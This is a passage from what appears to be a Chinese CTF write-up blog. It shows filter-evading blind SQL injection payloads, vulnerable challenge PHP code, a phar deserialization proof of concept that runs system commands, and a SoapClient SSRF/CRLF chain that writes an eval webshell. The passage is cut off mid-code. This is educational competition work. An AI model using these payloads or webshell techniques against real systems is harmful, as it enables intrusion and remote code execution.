set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/52 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/52 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 1                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/53 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/53 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 1                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select cast(ascii(version())/54 as char(1));</div><div class="line">+--------------------------------------+</div><div class="line">| cast(ascii(version())/54 as char(1)) |</div><div class="line">+--------------------------------------+</div><div class="line">| 0                                    |</div><div class="line">+--------------------------------------+</div><div class="line">1 row in set, 1 warning (0.00 sec)</div></pre></td></tr></table></figure><p>获取表名，这里就能够成功获取到当前数据库<code>group_concat(table_name)</code>的第一个字符和长度了</p><p>因为这里过滤了<code>in</code>，所以用<code>sys.schema_table_statistics代替information_schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/length(group_concat(table_name))/**/from/**/sys.schema_table_statistics)/14)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;延时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/length(group_concat(table_name))/**/from/**/sys.schema_table_statistics)/15)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p>所以当前数据库表名长度为14</p><p><img src="http://pic.c1imber.top/blog/20210115/wwqnoC6ODPQ2.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210115/2NTpYxjAQUG4.png?imageslim" alt="mark"></p><p>第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(left(group_concat(table_name),1))/**/from/**/sys.schema_table_statistics)/117)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;延时</p><p><img src="http://pic.c1imber.top/blog/20210115/IFhE8uUmvff9.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(left(group_concat(table_name),1))/**/from/**/sys.schema_table_statistics)/118)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p><img src="http://pic.c1imber.top/blog/20210115/XB5cXeEVrjWq.png?imageslim" alt="mark"></p><p>判断出<code>group_concat(table_name)</code>第一个字符的ascii码为117,也就是u</p><p>方法二：</p><p>使用between and</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version());</div><div class="line">+------------------+</div><div class="line">| ascii(version()) |</div><div class="line">+------------------+</div><div class="line">|               53 |</div><div class="line">+------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version()) between 1 and 52;</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(version()) between 1 and 52 |</div><div class="line">+-----------------------------------+</div><div class="line">|                                 0 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(version()) between 1 and 53;</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(version()) between 1 and 53 |</div><div class="line">+-----------------------------------+</div><div class="line">|                                 1 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>突破第二点：</p><p>因为ascii只能获取到第一个字符的ascii码，而且这里过滤了大部分常见的<code>substr、mid</code>字符串截取函数，并且过滤了一些特殊字符，导致情况变的有些困难</p><p>1、如果要使用<code>trim</code>去进行判断的话，需要用到leading和trailing，但是这里过滤了in</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">trim(leading &apos;s1&apos; from &apos;s2&apos;) 从左边截取，删除字符串s2当中的字符串s1</div><div class="line">trim(trailing &apos;s1&apos; from &apos;s2&apos;) 从右边截取，删除字符串s2当中的字符串s1</div><div class="line">mysql&gt; select ascii(trim(version()));</div><div class="line">+------------------------+</div><div class="line">| ascii(trim(version())) |</div><div class="line">+------------------------+</div><div class="line">|                     53 |</div><div class="line">+------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(leading &apos;5&apos; from version());</div><div class="line">+----------------------------------+</div><div class="line">| trim(leading &apos;5&apos; from version()) |</div><div class="line">+----------------------------------+</div><div class="line">| .7.32-0ubuntu0.16.04.1           |</div><div class="line">+----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(trim(leading &apos;5&apos; from version()));</div><div class="line">+-----------------------------------------+</div><div class="line">| ascii(trim(leading &apos;5&apos; from version())) |</div><div class="line">+-----------------------------------------+</div><div class="line">|                                      46 |</div><div class="line">+-----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(leading &apos;5.&apos; from version());</div><div class="line">+-----------------------------------+</div><div class="line">| trim(leading &apos;5.&apos; from version()) |</div><div class="line">+-----------------------------------+</div><div class="line">| 7.32-0ubuntu0.16.04.1             |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>2、过滤了right，导致下面方法不能用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select right(left(version(),2),1);</div><div class="line">+----------------------------+</div><div class="line">| right(left(version(),2),1) |</div><div class="line">+----------------------------+</div><div class="line">| .                          |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select right(left(version(),3),1);</div><div class="line">+----------------------------+</div><div class="line">| right(left(version(),3),1) |</div><div class="line">+----------------------------+</div><div class="line">| 7                          |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>绕过方法：</p><p>1、可以使用replace，猜测出第一个字符后，把该字符替换为空，这样依次处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select replace(version(),&apos;5.&apos;,&apos;&apos;);</div><div class="line">+----------------------------+</div><div class="line">| replace(version(),&apos;5.&apos;,&apos;&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 7.32-0ubuntu0.16.04.1      |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(version(),&apos;5.7&apos;,&apos;&apos;);</div><div class="line">+-----------------------------+</div><div class="line">| replace(version(),&apos;5.7&apos;,&apos;&apos;) |</div><div class="line">+-----------------------------+</div><div class="line">| .32-0ubuntu0.16.04.1        |</div><div class="line">+-----------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>方法缺陷：<br>加入flag数据如：flag{123123},当判断到第3个字符后，第四次判断是<code>replace</code>把123变成空，导致不能正常判断了</p><p>方法改进：使用<code>replace+left</code>组合的方式（这种方法也有一些小的缺陷，如果刚好第一个字符和第二个字符一样，那么使用left依旧不能解决这种问题，不过只要遇到了这个缺陷，那么在知道内容长度的情况下，就可以判断出第二个字符了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select replace(&apos;123123&apos;,&apos;123&apos;,&apos;&apos;);</div><div class="line">+----------------------------+</div><div class="line">| replace(&apos;123123&apos;,&apos;123&apos;,&apos;&apos;) |</div><div class="line">+----------------------------+</div><div class="line">|                            |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(left(&apos;123123&apos;,4),&apos;123&apos;,&apos;&apos;);</div><div class="line">+------------------------------------+</div><div class="line">| replace(left(&apos;123123&apos;,4),&apos;123&apos;,&apos;&apos;) |</div><div class="line">+------------------------------------+</div><div class="line">| 1                                  |</div><div class="line">+------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select replace(left(&apos;123123&apos;,5),&apos;1231&apos;,&apos;&apos;);</div><div class="line">+-------------------------------------+</div><div class="line">| replace(left(&apos;123123&apos;,5),&apos;1231&apos;,&apos;&apos;) |</div><div class="line">+-------------------------------------+</div><div class="line">| 2                                   |</div><div class="line">+-------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>最终构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if((select/**/cast(((select/**/ascii(replace(left(group_concat(table_name),7),&apos;users,&apos;,&apos;&apos;))/**/from/**/sys.schema_table_statistics)/83)/**/as/**/char(1))),benchmark(10000000,md5(1)),1),&apos;111&apos;%23&amp;password=1</div></pre></td></tr></table></figure><p>-&gt;延时</p><p>判断出users,的下一个表名第一个字符ascii码为70,为大写的F</p><p><img src="http://pic.c1imber.top/blog/20210115/qpCjBRQo1pYB.png?imageslim" alt="mark"></p><p>后来问了做出这道题的学长，表名其实应该是（SeCrrreT），当时看ascii码是70就延时了，就没往后试了，以为是F</p><p>绕过方法2：使用mysql字符串反转函数<code>reverse</code>（由于比赛的时候不能上网，记不起来这个函数名了，所以没有去试该函数是否被过滤了，这里说一下方法）</p><p>使用<code>left+reverse</code>组合进行绕过，用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select version();</div><div class="line">+-------------------------+</div><div class="line">| version()               |</div><div class="line">+-------------------------+</div><div class="line">| 5.7.32-0ubuntu0.16.04.1 |</div><div class="line">+-------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select reverse(left(version(),2));</div><div class="line">+----------------------------+</div><div class="line">| reverse(left(version(),2)) |</div><div class="line">+----------------------------+</div><div class="line">| .5                         |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(reverse(left(version(),2)));</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(reverse(left(version(),2))) |</div><div class="line">+-----------------------------------+</div><div class="line">|                                46 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select reverse(left(version(),3));</div><div class="line">+----------------------------+</div><div class="line">| reverse(left(version(),3)) |</div><div class="line">+----------------------------+</div><div class="line">| 7.5                        |</div><div class="line">+----------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select ascii(reverse(left(version(),3)));</div><div class="line">+-----------------------------------+</div><div class="line">| ascii(reverse(left(version(),3))) |</div><div class="line">+-----------------------------------+</div><div class="line">|                                55 |</div><div class="line">+-----------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>绕过方法3：<br>赛后和同事交流后发现依旧可以使用<code>trim</code>，用法：<br><code>trim(both &#39;s1&#39; from &#39;s2&#39;)</code> 删除字符串s2两边的s1</p><p>只要是字符串删除的方法，均会遇到上面所说的像replace那样的问题，使用<code>left</code>就能解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select trim(both &apos;123&apos; from &apos;123123&apos;);</div><div class="line">+--------------------------------+</div><div class="line">| trim(both &apos;123&apos; from &apos;123123&apos;) |</div><div class="line">+--------------------------------+</div><div class="line">|                                |</div><div class="line">+--------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select trim(both &apos;123&apos; from left(&apos;123123&apos;,4));</div><div class="line">+----------------------------------------+</div><div class="line">| trim(both &apos;123&apos; from left(&apos;123123&apos;,4)) |</div><div class="line">+----------------------------------------+</div><div class="line">| 1                                      |</div><div class="line">+----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure><p>其实也可以不用盲注</p><p>知道了系统的用户名为root</p><p>按照上面的方法构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;/**/and/**/true%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;响应中存在welcome Admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;/**/and/**/false%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;响应中不存在welcome Admin</p><p>使用布尔盲注代替时间盲注即可</p><p>比赛时这道题最终还是没有做出来，赛后根据这道题目做了个docker环境，题目代码逻辑和过滤关键字如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>((preg_match(<span class="string">"/sleep|update|extract|in|substr|mid|right|like|regexp|&lt;|=|&gt;|\^|\"|or/i"</span>, $_POST[<span class="string">'username'</span>])) || preg_match(<span class="string">"/sleep|update|extract|in|substr|mid|right|like|regexp|&lt;|=|&gt;|\^|\"|or/i"</span>, $_POST[<span class="string">'password'</span>]))</div><div class="line">    &#123;</div><div class="line">         <span class="keyword">die</span>(<span class="string">"hacker!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        $conn=mysqli_connect($dbhost,$dbuser,$dbpasswd,$dbname);</div><div class="line">        $sql=<span class="string">"select * from users where username='"</span>.$_POST[<span class="string">'username'</span>].<span class="string">"' and password='"</span>.$_POST[<span class="string">'password'</span>].<span class="string">"'"</span>;</div><div class="line">        <span class="keyword">echo</span> $sql.<span class="string">"\n\n"</span>;</div><div class="line">        <span class="keyword">if</span>(($result=mysqli_query($conn,$sql)) &amp;&amp; (mysqli_num_rows($result)&gt;<span class="number">0</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h1 color='red'&gt;Welcome,Admin!&lt;/h1&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Login Error"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据上面的绕过方法编写脚本</p><p><img src="http://pic.c1imber.top/blog/20210115/JbC8fLgNRN4R.png?imageslim" alt="mark"></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p><strong>hackshark</strong></p><p>在过滤器当中输入：<code>http.request.method==POST</code></p><p>过滤出http POST流量，分析http流量，发现为sql布尔盲注流量，猜测盲注的password字段就是flag</p><p>当判断为真时，响应当中会有<code>&lt;img src=&quot;../images/slap.jpg&quot;</code>的内容</p><p><img src="http://pic.c1imber.top/blog/20210115/ikcSG2xMkgNl.png?imageslim" alt="mark"></p><p>根据响应过滤出相应的内容<br><code>http contains &quot;/images/slap.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20210115/5OifB4TGm6rD.png?imageslim" alt="mark"></p><p>追踪http流，获取flag</p><p>flag{booool_sqli}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;12月份参加的线下赛，补一下，个人赛成绩不怎么好，在这记录一下&lt;/p&gt;
&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯总决赛web题</title>
    <link href="https://c1aysec.github.io/2020/12/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9Bweb%E9%A2%98/"/>
    <id>https://c1aysec.github.io/2020/12/14/2020网鼎杯总决赛web题/</id>
    <published>2020-12-13T16:36:23.152Z</published>
    <updated>2021-01-15T06:48:20.993Z</updated>
    
    <content type="html"><![CDATA[<h3 id="game-exp"><a href="#game-exp" class="headerlink" title="game_exp"></a>game_exp</h3><p>漏洞一：phar反序列化</p><p>regiter.php当中第3行-第9行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>AnyClass</code>类的<code>__destruct</code>存在反序列化，而第31行<code>file_exists</code>函数刚好可以触发phar反序列化</p><p><img src="http://pic.c1imber.top/blog/20201214/RS1sRe71nndP.png?imageslim" alt="mark"></p><p>poc构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;output=<span class="string">"system('ls /');"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</div><div class="line">$a=<span class="keyword">new</span> AnyClass();</div><div class="line">$phar-&gt;setMetadata($a);</div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>在注册的时候上传图片，图片内容为上面poc生成的phar文件</p><p><img src="http://pic.c1imber.top/blog/20201214/lWwmo4BQi326.png?imageslim" alt="mark"></p><p>之后通过phar://协议触发反序列化，执行命令</p><p><img src="http://pic.c1imber.top/blog/20201214/HMByfAS16VcK.png?imageslim" alt="mark"></p><p>漏洞二：</p><p>finger/index.php：第4行-第23行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line"><span class="keyword">if</span> ($ip == <span class="string">"127.0.0.1"</span>) &#123;</div><div class="line">    <span class="keyword">include_once</span> <span class="string">"../sqlhelper.php"</span>;</div><div class="line">    $uid = addslashes($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $mysql = <span class="keyword">new</span> sqlhelper();</div><div class="line">    $sql = <span class="string">"SELECT id FROM goder where uid = '$uid'"</span>;</div><div class="line">    $res = $mysql-&gt;execute_dml($sql);</div><div class="line">    <span class="keyword">if</span> ($res) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>])) &#123;</div><div class="line">            system($_POST[<span class="string">'cmd'</span>]);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('启动金手指模式!');&lt;/script&gt;"</span>;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('你还不是王者!');&lt;/script&gt;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('只有本地的王者才能访问!');&lt;/script&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到存在命令执行，但是<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>不能为127.0.0.1，这里当时不知道该怎么绕</p><p><strong>patch：</strong></p><p>regiter.php：把<code>AnyClass</code>类那段代码注释掉</p><p>finger/index.php：虽然绕不过去，但是通过漏洞一已经可以拿到flag了，这里只需要防御就行了，防御很简单，注释掉<code>system($_POST[&#39;cmd&#39;])</code>这段代码就行</p><p>game_exp赛后补充：</p><p>漏洞二：另一处phar反序列化pop链</p><p>全局搜索<code>__destruct</code>，在user.php第40行-第44行</p><p><img src="http://pic.c1imber.top/blog/20201214/TzAaDYn8Oumw.png?imageslim" alt="mark"></p><p>这里的<code>__destruct</code>将<code>user</code>类的<code>goder_text</code>成员变量进行了反序列化，然后调用了反序列化后对象的<code>recordOrNot</code>方法，这里可以把成员变量<code>goder_text</code>设置为php的内置类<code>SoapClient</code>，由于<code>SoapClient</code>类当中不存在<code>recordOrNot</code>方法，就会触发<code>SoapClient</code>类的<code>__call</code>方法，可以发起post请求，再结合CRLF就可以构造任意post请求，注意这里的soapclient触发的ssrf是没有回显的，所以需要通过写入webshell的方式</p><p>poc构造：</p><p>利用链：</p><p>register.php phar反序列化-&gt;利用<code>User</code>类<code>__destruct</code>代码，通过<code>SoapClient</code>内置类触发SSRF-&gt;结合CLRF构造任意POST请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$target = <span class="string">'http://127.0.0.1/finger/index.php'</span>;</div><div class="line">$headers = <span class="keyword">array</span>(</div><div class="line">    <span class="string">'Cookie: PHPSESSID=ie0il2me6irbvcqj1jebr67fu0'</span></div><div class="line">    );</div><div class="line">$post_string = <span class="string">'cmd=echo "&lt;?php @eval(\$_GET[1]);?&gt;" &gt; shell.php'</span>;</div><div class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">"aaab"</span>));</div><div class="line">$aaa = serialize($b);</div><div class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</div><div class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</div><div class="line"><span class="keyword">echo</span> $aaa;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($aaa=<span class="string">""</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span 